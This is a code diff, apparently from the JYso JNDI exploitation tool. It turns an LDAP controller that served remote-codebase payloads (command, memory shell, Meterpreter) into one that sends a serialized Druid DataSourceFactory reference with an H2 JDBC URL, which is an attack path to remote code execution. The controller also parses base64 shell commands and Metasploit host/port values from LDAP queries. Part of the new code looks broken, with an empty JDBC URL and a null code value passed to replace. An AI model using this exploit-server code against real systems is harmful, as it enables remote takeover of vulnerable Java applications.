@@ -2,77 +2,59 @@ package com.qi4l.JYso.controllers;
 
 import com.qi4l.JYso.enumtypes.GadgetType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
+import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
+import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
 import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.InjShell;
 import com.qi4l.JYso.gadgets.utils.Util;
 import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
-import com.qi4l.JYso.template.CommandTemplate;
-import com.qi4l.JYso.template.echoStatic.Meterpreter;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
-import java.net.URL;
-import java.util.Base64;
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
+import java.io.IOException;
+import java.lang.reflect.Field;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-@LdapMapping(uri = {"/basic"})
-public class BasicController implements LdapController {
+@LdapMapping(uri = {"/druid"})
+public class DruidController implements LdapController{
+    private String payloadType;
 
-    private static String     payloadType;
-    //最后的反斜杠不能少
-    private final  String     codebase = Config.codeBase;
-    private        String[]   params;
-    private        GadgetType gadgetType;
+    private String     factoryType;
+    private String[]   params;
+    private GadgetType gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + " @|green with basic remote reference payload|@"));
-            Entry  e         = new Entry(base);
-            String className = "";
+            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
+            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
 
-            if (payloadType.contains("E-")) {
-                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
-                className = EchoClass.getName();
-            }
+            Entry                                   e      = new Entry(base);
+            Reference                               ref    = new Reference("javax.sql.DataSource", "com.alibaba.druid.pool.DruidDataSourceFactory", null);
+            String                                  code   = null;
 
-            if (payloadType.contains("M-")) {
-                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
-                InjShell.init(params);
-                className = Gadgets.createClassB(ClassName1);
-            }
 
-            if (payloadType.contains("command")) {
-                CommandTemplate commandTemplate = new CommandTemplate(params[0]);
-                commandTemplate.cache();
-                className = commandTemplate.getClassName();
-            }
-
-            if (payloadType.contains("msf")) {
-                className = Meterpreter.class.getName();
-            }
-
-            String className1 = className.replaceAll("\\.", "/");
-
-            URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
-            System.out.println(ansi().render("@|green [+] Send LDAP reference result for |@" + base + " @|green redirecting to |@" + turl));
-            e.addAttribute("javaClassName", "foo");
-            e.addAttribute("javaCodeBase", this.codebase);
-            e.addAttribute("objectClass", "javaNamingReference");
-            e.addAttribute("javaFactory", className);
+            String JDBC_URL = "";
+            String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
+            ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
+            ref.add(new StringRefAddr("url", JDBC_URL1));
+            ref.add(new StringRefAddr("initialSize", "1"));
+            ref.add(new StringRefAddr("init", "true"));
+            e.addAttribute("javaClassName", "java.lang.String");
+            e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
             System.err.println("Error while generating or serializing payload");
             er.printStackTrace();
         }
-
     }
 
     @Override
@@ -91,24 +73,35 @@ public class BasicController implements LdapController {
             }
 
             int thirdIndex = base.indexOf("/", secondIndex + 1);
-            if (thirdIndex != -1) {
-                if (thirdIndex < 0) thirdIndex = base.length();
+            if (thirdIndex < 0) thirdIndex = base.length();
+
+            try {
+                factoryType = base.substring(secondIndex + 1, thirdIndex);
+                System.out.println(ansi().render("@|green [+] FactoryType : |@" + factoryType));
+            } catch (IllegalArgumentException e) {
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
+            }
+
+            int fourthIndex = base.indexOf("/", thirdIndex + 1);
+
+            if (fourthIndex != -1) {
+                if (fourthIndex < 0) fourthIndex = base.length();
                 try {
-                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
+                    gadgetType = GadgetType.valueOf(base.substring(thirdIndex + 1, fourthIndex).toLowerCase());
                 } catch (IllegalArgumentException e) {
-                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
+                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(thirdIndex + 1, fourthIndex));
                 }
             }
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+] Command   |@" + cmd));
+                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
                 params = new String[]{cmd};
             }
 
             if (gadgetType == GadgetType.shell) {
                 String   cmd1         = Util.getCmdFromBase(base);
-                byte[]   decodedBytes = Base64.getDecoder().decode(cmd1);
+                byte[]   decodedBytes = Util.base64Decode(cmd1);
                 String   cmd          = new String(decodedBytes);
                 String[] cmdArray     = cmd.split(" ");
                 System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
@@ -116,7 +109,7 @@ public class BasicController implements LdapController {
             }
 
             if (gadgetType == GadgetType.msf) {
-                String[] results1     = Util.getIPAndPortFromBase(base);
+                String[] results1 = Util.getIPAndPortFromBase(base);
                 Config.rhost = results1[0];
                 Config.rport = results1[1];
                 System.out.println("[+] RemotHost: " + results1[0]);
@@ -126,7 +119,7 @@ public class BasicController implements LdapController {
         } catch (Exception e) {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
-            throw new IncorrectParamsException("Incorrect params >> " + base);
+            throw new IncorrectParamsException("Incorrect params: " + base);
         }
     }
 }
